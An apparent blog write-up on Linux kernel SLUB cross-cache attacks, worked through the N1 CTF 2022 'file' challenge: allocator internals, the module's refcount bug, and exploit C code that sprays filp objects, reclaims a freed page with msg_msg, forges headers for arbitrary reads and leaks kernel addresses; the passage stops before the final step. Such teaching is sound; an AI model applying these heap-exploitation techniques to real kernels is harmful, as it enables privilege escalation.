---
title: Cross Cache Attacks
date: '2026-04-05T05:30:00+05:30'
event: Blog Post
category: Research
difficulty: Intermediate
author:
- VulnX
tags:
- pwn
- kernel
- 0-day
description: A detailed writeup for studying Cross-Cache attacks in the Linux kernel SLUB allocator. With N1 CTF 2022 file challenge as reference.
---

A detailed writeup for studying Cross-Cache attacks in the Linux kernel SLUB allocator. With N1 CTF 2022 file challenge as reference.

---

# Reference Material

## SLUB
- [https://events.static.linuxfound.org/images/stories/pdf/klf2012_kim.pdf](https://events.static.linuxfound.org/images/stories/pdf/klf2012_kim.pdf)
- [https://ruffell.nz/programming/writeups/2019/02/15/looking-at-kmalloc-and-the-slub-memory-allocator.html](https://ruffell.nz/programming/writeups/2019/02/15/looking-at-kmalloc-and-the-slub-memory-allocator.html)
- [https://blogs.oracle.com/linux/linux-slub-allocator-internals-and-debugging-1](https://blogs.oracle.com/linux/linux-slub-allocator-internals-and-debugging-1)
- [https://sam4k.com/linternals-memory-allocators-0x02/](https://sam4k.com/linternals-memory-allocators-0x02/)

## BUDDY
- [https://syst3mfailure.io/linux-page-allocator/](https://syst3mfailure.io/linux-page-allocator/)
- [https://www.geeksforgeeks.org/operating-systems/buddy-system-memory-allocation-technique/](https://www.geeksforgeeks.org/operating-systems/buddy-system-memory-allocation-technique/)

## CROSS-CACHE
- [https://u1f383.github.io/linux/2025/01/03/cross-cache-attack-cheatsheet.html](https://u1f383.github.io/linux/2025/01/03/cross-cache-attack-cheatsheet.html)
- [https://www.usenix.org/system/files/sec23summer_79-lee-prepub.pdf](https://www.usenix.org/system/files/sec23summer_79-lee-prepub.pdf)
- [https://dl.acm.org/doi/10.1145/3719027.3765152](https://dl.acm.org/doi/10.1145/3719027.3765152)
- [https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people/](https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people/)
- [https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf](https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf)

---

# Lab

Tested against: [Linux Kernel v6.12](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?h=v6.12).

Source files: [GitHub](https://github.com/VulnX/cross-cache).

---

# CTF Writeup Reference

For a practical example of cross-cache exploitation we will be using N1 CTF's `file` challenge.

> Description <br />
> <br />
> Baidu: https://pan.baidu.com/s/1IA2CrwBvTvF3mxOhFR-MOA?pwd=Nu1L <br />
> Google: https://drive.google.com/file/d/1D74stCuWdMo5t6XlvIx5LZywHNaSdmmU/view?usp=share_link <br />
> <br />
> nc 1.13.24.237 9999 <br />
> nc 43.154.94.36 9999 <br />
> <br />
> Distribution: distribute.zip <br />
> Points: 1000 <br />
> Solves: 1 <br />

See [source](https://github.com/mito753/Kernel-Exploit-Dojo/tree/main/2022/N1CTF_2022/Pwn_File).

## Initial analysis

As with any kernel CTF challenge, we are provided the following three files:

- `bzImage`
- `launch.sh`
- `rootfs.cpio`

> NOTE: We can use [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) to extract a semi-unstripped kernel `vmlinux` file out of the `bzImage`. This will be very helpful.

```
$ file bzImage                                                            
bzImage: Linux kernel x86 boot executable, bzImage, version 5.18.12 (chenhaohao@ubuntu) #11 SMP PREEMPT_DYNAMIC Tue Jul 26 13:39:23 CST 2022, RO-rootFS, Normal VGA, setup size 512*30, syssize 0x9743a, jump 0x26c 0x8cd88ec0fc8cd239 instruction, protocol 2.15, from protected-mode code at offset 0x4cc 0x94b966 bytes ZST compressed, relocatable, handover offset 0x190, legacy 64-bit entry point, can be above 4G, 32-bit EFI handoff entry point, 64-bit EFI handoff entry point, EFI kexec boot support, xloadflags bit 5, max cmdline size 2047, init_size 0x302c000
```

It uses linux 5.18.12, we will need to keep [elixir bootlin](https://elixir.bootlin.com/linux/v5.18.12/source) always open :D

This is `launch.sh`:

```bash
#!/bin/bash

qemu-system-x86_64 \
    -smp 2 \
    -m 2G \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -append "console=ttyS0 kaslr quiet panic=1" \
    -monitor /dev/null \
    -cpu kvm64,+smep,+smap \
    -nographic
```

I will swap out kcmdline parameters `kaslr` with `nokaslr` for easier debugging with [pwndbg](https://pwndbg.re).

If we extract the rootfs with

```shell
fakeroot cpio -idmv < ../rootfs.cpio
```

we will obtain the `init` file:

```bash
#!/bin/sh
mkdir /proc
mkdir /sys
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mkdir /dev/pts
mount -t devpts devpts /dev/pts

insmod /mod.ko
chmod 666 /dev/vuln

setsid cttyhack setuidgid 1000 /bin/sh
 

umount /proc
umount /sys
poweroff -d 0  -f
```

and obviously the main `mod.ko` file.

Reverse engineering the kernel module with IDA gives this pseudo-source code:

```c
int __cdecl drv_init()
{
  int v0; // r12d

  _fentry__();
  v0 = misc_register(&misc_device);
  if ( v0 )
    printk("failed register misc device\n");
  else
    printk("succeeded register char device: %s\n", "vuln");
  return v0;
}

void __cdecl drv_exit()
{
  printk("removing device\n");
  misc_deregister(&misc_device);
}

int __fastcall drv_open(inode *inode, file *file)
{
  _QWORD *v2; // rbx
  int result; // eax

  _fentry__(inode, file);
  v2 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[6], 0xCC0LL, 40LL);
  _mutex_init(v2, "&tmp->mutex", &_key_33227);
  file->private_data = v2;
  result = 0;
  v2[4] = 0LL;
  return result;
}

int __fastcall drv_release(inode *inode, file *file)
{
  _fentry__(inode, file);
  kfree(file->private_data);
  return 0;
}

__int64 __fastcall drv_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg)
{
  unsigned int v4; // r12d
  _QWORD *private_data; // r13
  __int64 result; // rax

  _fentry__(filp, cmd);
  v4 = (unsigned int)arg;
  private_data = filp->private_data;
  mutex_unlock(private_data);
  if ( cmd == 0xDEAD00 )
  {
    private_data[4] = fget(v4);
  }
  else
  {
    result = -22LL;
    if ( cmd != 0xDEAD01 )
      return result;
    fput(private_data[4]);
  }
  mutex_lock(private_data);
  return 0LL;
}
```

With `cmd = 0xDEAD00` the driver uses [`fget`](https://elixir.bootlin.com/linux/v5.18.12/source/fs/file.c#L951) (increments refcount) to extract the associated `struct file *` from the given `fd`, and stores the object reference in `private_data[4]`. With `cmd = 0xDEAD01` the driver uses [`fput`](https://elixir.bootlin.com/linux/v5.18.12/source/fs/file_table.c#L392) to decrease the [refcount](https://elixir.bootlin.com/linux/v5.18.12/source/include/linux/fs.h#L946) of the file object stored in `private_data[4]`.

Good things:

1. There are mutex locks for IOCTL operations.

Bad things:

1. The locks are inverted: it unlocks first and locks later. Basically, unnrestricted entry into the IOCTL handler.
2. Locks aren't needed: The `fget` and `fput` operations are independent. We don't need to race, we can just call them independently and achieve our goal.

What can we do:

- We can load the `struct file` object reference of any open `fd` into the driver's private data.
- We can (maliciously) decrement its `refcount` any number of times. When the `refcount` becomes `0`, the kernel will attempt to free the `file` object with the following call graph ([see here](https://elixir.bootlin.com/linux/v5.18.12/source/fs/file_table.c#L371)):

<pre class="mermaid center">
sequenceDiagram
    autonumber
    actor Process as Process / Caller
    participant WQ as Kworker (delayed_fput)
    participant RCU as RCU Subsystem

    Note over Process: Releasing file descriptor
    Process->>Process: fput_many()
    Process->>WQ: schedule_delayed_work()
    Note over Process, WQ: 1 Jiffy Delay passes
    
    activate WQ
    WQ->>WQ: delayed_fput()
    WQ->>WQ: __fput()
    WQ->>WQ: file_free()
    WQ->>RCU: call_rcu(&f->f_u.fu_rcuhead, file_free_rcu)
    deactivate WQ

    Note over WQ, RCU: Wait for RCU Grace Period
    
    activate RCU
    RCU->>RCU: file_free_rcu()
    critical Free SLAB Memory
        RCU->>RCU: kmem_cache_free(filp_cachep, f)
    end
    deactivate RCU
</pre>

A UAF over a [`file`](https://elixir.bootlin.com/linux/v5.18.12/source/include/linux/fs.h#L932) object is very helpful from an exploitation perspective, because we can overwrite the [`->f_op`](https://elixir.bootlin.com/linux/v5.18.12/source/include/linux/fs.h#L939) field and directly hijack RIP.

That being said, we cannot simply free a `file` object and overlap it with an elastic object (say, `msg_msg`). The reason is, (like [dirtycred](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf) for `struct cred`) the `struct file` objects are also a very popular target, which is why the kernel has dedicated isolate slab caches (`filp`) for these type of objects. Hence the need for cross-cache attack to solve this challenge.

> Traditional dirtycred style attack won't work here (or at least, I wasn't successful) because the rootfs is read-only and there are no setuid binaries (except for `/sbin/sudo`, which is a troll).

## Understanding Cross-cache attack

The key idea of a cross-cache attack relies on exploiting how the Linux kernel manages memory. Unlike userspace `glibc` malloc, where any standard allocation can reuse a recently freed chunk of memory, the kernel's SLUB allocator manages memory through dedicated caches. Consequently, freeing an object does not immediately return that memory to a general pool.

However, this separation is not absolute. Eventually, the SLUB allocator must return unused pages back to the global memory pool (the zoned buddy allocator). The goal of a cross-cache attack is to pinpoint exactly when and where this page release occurs, allowing us to reclaim that same memory address from a different slab cache.

<pre class="mermaid center">
graph TD
    %% Styling
    classDef memory stroke:#333,stroke-width:2px;
    classDef process stroke:#0288d1,stroke-width:2px;
    classDef attack stroke:#c62828,stroke-width:2px;
    
    %% Nodes
    subgraph Userspace ["Userspace (e.g., glibc malloc)"]
        A[Free Memory] -->|Directly Reused| B[Any New Allocation]
    end

    subgraph Kernel ["Kernel Space (Cross-Cache Attack)"]
        direction TB
        
        C[Vulnerable Cache: Object A]:::memory
        D[Free Object A]:::process
        E[Slab Page is Now Empty]:::memory
        F[Zoned Buddy Allocator<br/>Global Memory Pool]:::memory
        G[Target Cache: Object B]:::memory
        H[Memory Hijacked!]:::attack

        C --> D
        D -->|Memory kept inside Dedicated Cache| E
        E -->|Trigger Condition: Page Released| F
        F -->|Reallocated to Different Cache| G
        G -->|Attacker controls Object B at Object A's old address| H
    end

    %% Apply Classes
    class Userspace,Kernel memory;
</pre>

Let's understand the "Trigger Condition" now.

Sample `filp` slab info from `pwndbg`:

```
pwndbg> slab info filp --cpu 1 -v
 Slab Cache @ 0xffff8880039e6600
     Name: filp
     Flags: SLAB_HWCACHE_ALIGN | SLAB_PANIC
     Offset: 0x70
     Slab size: 0x1000
     Size (including metadata): 0x100
     Align: 0x40
     Object Size: 0x100
     Usercopy region offset: 0
     Usercopy region size: 0
     kmem_cache_cpu @ 0xffff88807d738840 [CPU 0]:
         Freelist: 0xffff888004d70200
         Active Slab:
             - Slab @ 0xffff888004d70000 [0xffffea0000135c00]:
                 In-Use: 0/16
                 Frozen: 1
                 Freelist: 0x0
                     - [0x09] 0xffff888004d70000 (next: 0xffff888004d70a00) [CPU cache]
                     - [0x07] 0xffff888004d70100 (next: 0xffff888004d70e00) [CPU cache]
                     - [0x00] 0xffff888004d70200 (next: 0xffff888004d70400) [CPU cache]
                     - [0x0f] 0xffff888004d70300 (no next) [CPU cache]
                     - [0x01] 0xffff888004d70400 (next: 0xffff888004d70800) [CPU cache]
                     - [0x0e] 0xffff888004d70500 (next: 0xffff888004d70300) [CPU cache]
                     - [0x06] 0xffff888004d70600 (next: 0xffff888004d70100) [CPU cache]
                     - [0x04] 0xffff888004d70700 (next: 0xffff888004d70d00) [CPU cache]
                     - [0x02] 0xffff888004d70800 (next: 0xffff888004d70f00) [CPU cache]
                     - [0x0d] 0xffff888004d70900 (next: 0xffff888004d70500) [CPU cache]
                     - [0x0a] 0xffff888004d70a00 (next: 0xffff888004d70b00) [CPU cache]
                     - [0x0b] 0xffff888004d70b00 (next: 0xffff888004d70c00) [CPU cache]
                     - [0x0c] 0xffff888004d70c00 (next: 0xffff888004d70900) [CPU cache]
                     - [0x05] 0xffff888004d70d00 (next: 0xffff888004d70600) [CPU cache]
                     - [0x08] 0xffff888004d70e00 (next: 0xffff888004d70000) [CPU cache]
                     - [0x03] 0xffff888004d70f00 (next: 0xffff888004d70700) [CPU cache]
         Partial Slabs [nr_slabs/cpu_partial_slabs: 0x3/0x7]
             - Slab @ 0xffff8880057b7000 [0xffffea000015edc0]:
                 In-Use: 0/16
                 Frozen: 1
                 Freelist: 0xffff8880057b7a00
                     - [0x04] 0xffff8880057b7000 (next: 0xffff8880057b7700)
                     - [0x0e] 0xffff8880057b7100 (next: 0xffff8880057b7900)
                     - [0x0a] 0xffff8880057b7200 (next: 0xffff8880057b7c00)
                     - [0x06] 0xffff8880057b7300 (next: 0xffff8880057b7600)
                     - [0x09] 0xffff8880057b7400 (next: 0xffff8880057b7200)
                     - [0x08] 0xffff8880057b7500 (next: 0xffff8880057b7400)
                     - [0x07] 0xffff8880057b7600 (next: 0xffff8880057b7500)
                     - [0x05] 0xffff8880057b7700 (next: 0xffff8880057b7300)
                     - [0x0d] 0xffff8880057b7800 (next: 0xffff8880057b7100)
                     - [0x0f] 0xffff8880057b7900 (no next)
                     - [0x00] 0xffff8880057b7a00 (next: 0xffff8880057b7e00)
                     - [0x03] 0xffff8880057b7b00 (next: 0xffff8880057b7000)
                     - [0x0b] 0xffff8880057b7c00 (next: 0xffff8880057b7d00)
                     - [0x0c] 0xffff8880057b7d00 (next: 0xffff8880057b7800)
                     - [0x01] 0xffff8880057b7e00 (next: 0xffff8880057b7f00)
                     - [0x02] 0xffff8880057b7f00 (next: 0xffff8880057b7b00)
             - Slab @ 0xffff8880057b9000 [0xffffea000015ee40]:
                 In-Use: 0/16
                 Frozen: 1
                 Freelist: 0xffff8880057b9300
                     - [0x08] 0xffff8880057b9000 (next: 0xffff8880057b9500)
                     - [0x04] 0xffff8880057b9100 (next: 0xffff8880057b9400)
                     - [0x0d] 0xffff8880057b9200 (next: 0xffff8880057b9b00)
                     - [0x00] 0xffff8880057b9300 (next: 0xffff8880057b9600)
                     - [0x05] 0xffff8880057b9400 (next: 0xffff8880057b9800)
                     - [0x09] 0xffff8880057b9500 (next: 0xffff8880057b9c00)
                     - [0x01] 0xffff8880057b9600 (next: 0xffff8880057b9e00)
                     - [0x0f] 0xffff8880057b9700 (no next)
                     - [0x06] 0xffff8880057b9800 (next: 0xffff8880057b9a00)
                     - [0x0c] 0xffff8880057b9900 (next: 0xffff8880057b9200)
                     - [0x07] 0xffff8880057b9a00 (next: 0xffff8880057b9000)
                     - [0x0e] 0xffff8880057b9b00 (next: 0xffff8880057b9700)
                     - [0x0a] 0xffff8880057b9c00 (next: 0xffff8880057b9f00)
                     - [0x03] 0xffff8880057b9d00 (next: 0xffff8880057b9100)
                     - [0x02] 0xffff8880057b9e00 (next: 0xffff8880057b9d00)
                     - [0x0b] 0xffff8880057b9f00 (next: 0xffff8880057b9900)
             - Slab @ 0xffff88800573d000 [0xffffea000015cf40]:
                 In-Use: 0/16
                 Frozen: 1
                 Freelist: 0xffff88800573da00
                     - [0x0a] 0xffff88800573d000 (next: 0xffff88800573d600)
                     - [0x0f] 0xffff88800573d100 (no next)
                     - [0x08] 0xffff88800573d200 (next: 0xffff88800573d700)
                     - [0x03] 0xffff88800573d300 (next: 0xffff88800573d400)
                     - [0x04] 0xffff88800573d400 (next: 0xffff88800573db00)
                     - [0x0c] 0xffff88800573d500 (next: 0xffff88800573dd00)
                     - [0x0b] 0xffff88800573d600 (next: 0xffff88800573d500)
                     - [0x09] 0xffff88800573d700 (next: 0xffff88800573d000)
                     - [0x07] 0xffff88800573d800 (next: 0xffff88800573d200)
                     - [0x01] 0xffff88800573d900 (next: 0xffff88800573dc00)
                     - [0x00] 0xffff88800573da00 (next: 0xffff88800573d900)
                     - [0x05] 0xffff88800573db00 (next: 0xffff88800573de00)
                     - [0x02] 0xffff88800573dc00 (next: 0xffff88800573d300)
                     - [0x0d] 0xffff88800573dd00 (next: 0xffff88800573df00)
                     - [0x06] 0xffff88800573de00 (next: 0xffff88800573d800)
                     - [0x0e] 0xffff88800573df00 (next: 0xffff88800573d100)
     kmem_cache_node @ 0xffff8880039e3bc0 [NUMA node 0, nr_partial/min_partial: 0x0/0x5]:
         Partial Slabs: (none)
```

To achieve high performance and minimize locks, the SLUB allocator organizes memory hierarchically across CPUs and NUMA nodes.

```
[kmem_cache (filp)]
        │
        ├───►; [kmem_cache_cpu (Per-CPU)] ───►; Active Slab (Fast Path)
        │           │
        │           └───►; CPU Partial List (Max: cpu_partial)
        │
        └───►; [kmem_cache_node (Per-NUMA Node)] ───►; Node Partial List
                    │
                    ▼
           [Buddy Allocator] (Global Page Pool)
```

To avoid global locks, every CPU has its own private tracking structure for the cache. For instance, CPU 0 tracks its state via `kmem_cache_cpu @ 0xffff88807d738840`.

**Active slab**: The primary page of memory currently bound to the CPU for fast allocations. Serving memory allocation requests (`kmem_cache_alloc`) instantly without needing any locks (the "fast path").

**Freelist**: A lockless singly linked list pointing directly to available chunks *inside* the active slab.

**Partial lists**: If the slab page where the object lives was completely full, freeing one object makes it partial. If `kmem_cache_cpu` needs a fresh chunk (and freelist is empty), it looks into its local Partial Slabs queue. `filp` cache can hold upto 7 `cpu_partial` lists.

General allocation path:

1. Chunks are allocated from `kmem_cache_cpu->freelist`.
2. Once exhausted, the allocator checks the CPU's local Partial Slabs (up to 7).
3. If the CPU partial list is also empty, it falls back to the `kmem_cache_node` partial list.

General free path:

1. Free in the active slab is tracked in the active slab.
2. Free in a non-active slab (otherwise fully filled) now pushes it in the partial list.
3. When the partial list overflows (7 in case of `filp`), it goes to `kmalloc_cache_node`
4. The `kmem_cache_node` wants to keep at least 5 partial slabs on hand so it doesn't accidentally discard memory it might need a split second later. If the node has more than 5 partial slabs, and a completely empty slab page comes along, that is when the page is eligible to be dissolved.

TL;DR

When a slab page becomes entirely empty (In-Use: 0/16) AND the kmem_cache_node has already satisfied its min_partial requirement (5 slabs), the allocator unmaps the slab page and hands the raw physical frames back to the global Zoned Buddy Allocator.

---

Now let's try to apply this on the challenge.

```c
	pin_to_cpu(0);

	[...]

	LOG_INFO("Starting exploit...");
	int fd = open("/dev/vuln", O_RDONLY);
	LOG_INFO("fd = %d", fd);
	int tmp_fd[8 * 16];
	for (int i = 0 ; i < ARR_LEN(tmp_fd) ; i++) {
		tmp_fd[i] = open("/tmp/file", O_RDWR | O_CREAT, 0666);
	}
```

Since the VM is multi-core, I will pin the process to CPU 0 for consistency. For `filp` cache, there can be upto `16` objects per page/slab. I will spray `8` full pages of `tmp_fd`.

In a normal scenario, I am expecting the active slab to be partially filled with existing chunks. In such a case, the first `16` objects will completely fill it and (possibly) request another page. At this time, we can be sure that even if the active slab was completely empty, even then the object at index `17` would definetly be a part of our "clean" fully sprayed page.

![Before Spray vs After Spray vs After Drain](/assets/img/3861dd2e6444cc902fd33234351f77638902fa4da9630a22baca55d7a4d59fd2.svg)

```c
	[...]
	int uaf_idx = 17;
	/* (unnecessarily, for us) increases refcount by 1 => 2 */
	ioctl(fd, FGET, tmp_fd[uaf_idx]);
	/* (neutralize) decreases refcount by 1 => 1 */
	ioctl(fd, FPUT);

	LOG_INFO("Freeing all tmp_fd[]");
	for (int i = 0 ; i < ARR_LEN(tmp_fd) ; i++) {
		if (i == uaf_idx) {
			ioctl(fd, FPUT); /* => 0 ... UAF */
			LOG_INFO("UAF object should be freed by now");
		} else {
			close(tmp_fd[i]);
		}
	}
	LOG_INFO("UAF page should be returned to buddy allocator");
	[...]
```

Now I will start to free all sprayed objects. One-by-one they start filling the `cpu_partial` list. The upper limit for `cpu_partial` is `7` slabs. Once our `8th` sprayed page starts getting freed, it "triggers" the overflow, which pushes the pages to `kmem_cache_node`. Since `kmem_cache_node` will hold `5` slabs. The remaining (FIFO) will be returned to the buddy allocator.

> NOTE: We have used IOCTL `fput` to free the `struct file` object instead of `close()` so that `fd` still maps to the same memory address, creating a UAF. 

```c
/* Switches to CPU 1 for allocation of message queue */
int fetch_msq()
{
	pin_to_cpu(1);
	int ret = get_msq();
	pin_to_cpu(0);
	return ret;
}

int main(void)
{
	[...]
	LOG_INFO("Spraying 0x100 msg_msg now");
	int primary_msq[32];
	for (int i = 0 ; i < (sizeof primary_msq / sizeof primary_msq[0]) ; i++) {
			primary_msq[i] = fetch_msq();
			sprintf(mymsg.mtext, "OLD_%d", i);
			memcpy(&mymsg.mtext[0x38 - sizeof(struct msg_msg)], "\x01", 1);
			msg_send(&mymsg, primary_msq[i], 256 - sizeof(struct msg_msg));
	}
	LOG_INFO("Done. Testing for successful cross-cache page reclaim");
```

Now I will spray a bunch of primary `msg_msg` objects in `kmalloc-cg-256` slab. Eventually the SLUB allocator will run out of pages and request buddy for memory, at this point buddy will recycle our previously freed slabs and hand over the UAF-containing-slab. At this point we can be somewhat convinced that one of our `msg_msg` spray object has overwritten the `struct file` victim object.

> NOTE: A very important point to observe is that, coincidentally due to `sizeof(struct msq)`, it also gets sprayed in `kmalloc-cg-256`. This is not what we want as it will reduce our changes of `msg_msg` overwriting victim. To solve this, I took advantage of multi-core environment and ensured that `msq` is allocated on CPU 1. This ensures our `msg_msg` and victim are existing and isolated on CPU 0 itself.

```c
	[...]
	ioctl(fd, FPUT);
	LOG_INFO("Spraying segmented msg_msg now (for overlap)");
	int secondary_msq[32];
	struct msg_msg fake_msg;
	fake_msg.m_list.next = 0, /* cannot use */
	fake_msg.m_list.prev = 0,
	fake_msg.m_type = 1,
	fake_msg.m_ts = 0x1000,
	fake_msg.next = 0, /* can be used for arb read */
	fake_msg.security = 0,
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		/* LOG_INFO("new_msg_id[%d] = %d", i, new_msg_id[i]); */
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}
	[...]
```

Again I will free UAF object and reclaim it by spraying a set of larger `msg_msg` objects. The idea is to overlap the segment of `secondary_msq` with the `struct msg_msg` headers one of the `primary_msq` objects. This allows me to fake the headers and create OOB reads.

```c
	[...]
	int idx = -1;
	int next_idx = -1;
	for (int i = 0 ; i < ARR_LEN(primary_msq) && idx == -1 ; i++) {
		msg_recv(&mymsg, primary_msq[i], sizeof(mymsg.mtext), MSG_COPY);
		int res;
		for (int j = 0x100 ; j < 0x1000 ; j += 0x100) {
			if (sscanf(&mymsg.mtext[j], "OLD_%d", &res) == 1) {
				idx = i;
				next_idx = res;
				break;
			}
		}
	}
	if (idx == -1 || next_idx == -1)
		panic("failed to find leak");	
	LOG_SUCCESS("Cross-cache reclaim successful");
	LOG_INFO("idx=%d, next_idx=%d", idx, next_idx);
	[...]
```

I will then receive (ensure to use `MSG_COPY` otherwise unlinking will make the kernel panic due to corrupted `m_list`) all msgs in `primary_msq[]` and check the dump for successful OOB read. With this pattern I find the exact index in `primary_msq` which overlaps with UAF object as well its next (physically contiguous) object.

```c
	[...]
	LOG_INFO("Sending 2nd msg in primary_msq[next_idx]");
	msg_send(&mymsg, primary_msq[next_idx], 512 - sizeof(struct msg_msg));
	LOG_INFO("Spraying pipe buffer now");
	int pipefd[8][2];
	for (int i = 0 ; i < ARR_LEN(pipefd) ; i++) {
		if (pipe(pipefd[i]) == -1)
			panic("failed to create pipe");
		/*
		 * 8 * PAGE_SIZE = 8 * object allocation = 8 * 0x40 sized ring buffer
		 * => ring buffer goes in kmalloc_cg_512
		 */
		if (fcntl(pipefd[i][0], F_SETPIPE_SZ, 8 * PAGE_SIZE) == -1)
			panic("failed to set pipe size");
		write(pipefd[i][1], "AAAABBBB", 8); /* populate pipe_buffer */
	}
	[...]
```

Then I will send a second message in `primary_msq[next_idx]`. This message would go in `kmalloc-cg-512`. After that I will immediately spray and fill the remaining page with [`pipe_buffer`](https://elixir.bootlin.com/linux/v5.18.12/source/include/linux/pipe_fs_i.h#L26) objects. The reason for spraying `msg_msg` in a different cache is that, I want the 2nd message and `pipe_buffer` spray to be in the same cache (and ideally in the same page as well). Since `pipe_buffer` cannot go in `kmalloc-cg-256` the next viable candidate is the `-512` variant.

```c
	[...]
	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	uint64_t kmalloc_cg_512_addr = -1;
	for (int j = 0x100 ; j < 0x1000 ; j += 0x100) {
		int res;
		if (sscanf(&mymsg.mtext[j], "OLD_%d", &res) == 1) {
			if (res != next_idx) {
				LOG_INFO("[IGNORE] Found msq_id: %d (Expected: %d)", res, next_idx);
				continue;
			}
			kmalloc_cg_512_addr = *(uint64_t *)&mymsg.mtext[j - 0x30];
		}
	}
	if (kmalloc_cg_512_addr == -1)
		panic("failed to find kmalloc_cg_512 addr");
	LOG_INFO("kmalloc_cg_512 = %#lx", kmalloc_cg_512_addr);
	[...]
```

Now that the 2nd message is sent, I will use the overwritten "fake msg" object to obtain yet another OOB read. From this read we can leak the address of `kmalloc_cg_512` as it would be linked with the `primary_msq[next_idx]` via `m_list` header.

```c
	[...]
	// Reclaim with msg_msgseg and overwrite fake msg_msg->next = kmalloc_cg_512
	ioctl(fd, FPUT);
	LOG_INFO("Reclaim UAF object with msg_msgseg");
	fake_msg.m_list.next = 0; /* unused */
	fake_msg.m_list.prev = 0;
	fake_msg.m_type = 1;
	fake_msg.m_ts = PAGE_SIZE - sizeof(struct msg_msg) +
			PAGE_SIZE - sizeof(struct msg_msgseg);
	fake_msg.next = (void *)kmalloc_cg_512_addr + sizeof(struct msg_msg) - 8;
	fake_msg.security = 0;
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}
	[...]
```

Then I will free UAF object again and reclaim with another message segment. This time the goal is to overwrite `->next` field with `kmalloc-cg-512` address and obtain AAR (Arbitrary Address Read) from that page.

```c
	[...]
	// Leak whole page => you get kASLR leak
	LOG_INFO("Leaking kmalloc_cg_512 page for kASLR leak");
	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	UPDATE_KBASE(-1);
	uint64_t pipe_buffer_page;
	for (int i = PAGE_SIZE - sizeof(struct msg_msg) + 0x10 ;
	     i < sizeof(mymsg.mtext) ;
	     i += 0x10) {
		uint64_t addr = *(uint64_t *)&mymsg.mtext[i];
		if ((addr & 0xfff) == 0xc40) {
			UPDATE_KBASE(addr - 0x1242c40);
			pipe_buffer_page = *(uint64_t *)&mymsg.mtext[i - 0x10];
		}
	}
	if (KBASE == -1)
		panic("failed to find kbase");
	LOG_SUCCESS("KBASE @ %#lx", KBASE);
	LOG_INFO("pipe_buffer page @ %#lx", pipe_buffer_page);
	[...]
```

Leaking this page would also leak the `struct pipe_buffer`. `pipe_buffer` is a very good candidate here since it holds both a `vmemmap` address (`->page`) as well as an address from kernal base image (`->ops`, giving us kASLR leak).

```c
	[...]
	// Reclaim with msg_msgseg and overwrite fake msg_msg->next = base_offset_ptrs
	ioctl(fd, FPUT);
	uint64_t base_offset_ptrs = KBASE_OFFSET(0x16d7ff8);
	LOG_INFO("Reclaim UAF object with msg_msgseg");
	fake_msg.m_list.next = 0; /* unused */
	fake_msg.m_list.prev = 0;
	fake_msg.m_type = 1;
	fake_msg.m_ts = PAGE_SIZE - sizeof(struct msg_msg) +
			0x100 - sizeof(struct msg_msgseg);
	fake_msg.next = (void *)base_offset_ptrs; /* can be used for arb read */
	fake_msg.security = 0;
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	LOG_INFO("Leaking base_offset_ptrs for vmemmap_base & page_base_offset");
	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	dump(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)], 0x20);
	int vmemmap_base_index = PAGE_SIZE - sizeof(struct msg_msg);
	int page_offset_base_index = PAGE_SIZE - sizeof(struct msg_msg) + 0x10;
	uint64_t vmemmap_base = *(uint64_t *)&mymsg.mtext[vmemmap_base_index];
	uint64_t page_base_offset = *(uint64_t *)&mymsg.mtext[page_offset_base_index];
	LOG_SUCCESS("vmemmap_base @ %#lx", vmemmap_base);
	LOG_SUCCESS("page_base_offset @ %#lx", page_base_offset);
	[...]
```

Then I will repeat the standard "free-reclaim-read" primitive use the kASLR leak to read global pointers and obtain leaks for `vmemmap_base` and `page_base_offset`.

```c
	[...]
	/* sizeof(struct page) = 0x40 */
	int pfn = (pipe_buffer_page - vmemmap_base) / 0x40;
	LOG_INFO("pfn = %#x", pfn);
	uint64_t page_addr = page_base_offset + pfn * PAGE_SIZE;
	LOG_INFO("physical address = %#lx", page_addr);
	[...]
```

These leaks can be used to obtain the physical address of the page backing the `pipe_buffer` struct.

```c
	[...]
